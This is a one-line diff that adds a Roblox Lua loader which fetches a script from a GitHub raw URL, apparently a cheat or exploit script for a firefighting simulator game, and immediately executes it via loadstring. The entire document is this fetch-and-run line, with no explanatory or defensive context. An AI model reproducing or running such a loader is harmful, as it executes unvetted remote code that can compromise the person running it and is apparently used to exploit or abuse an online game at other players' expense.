@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/firefighting-sim-spam3-gcekr0u9m90xec.lua"))()
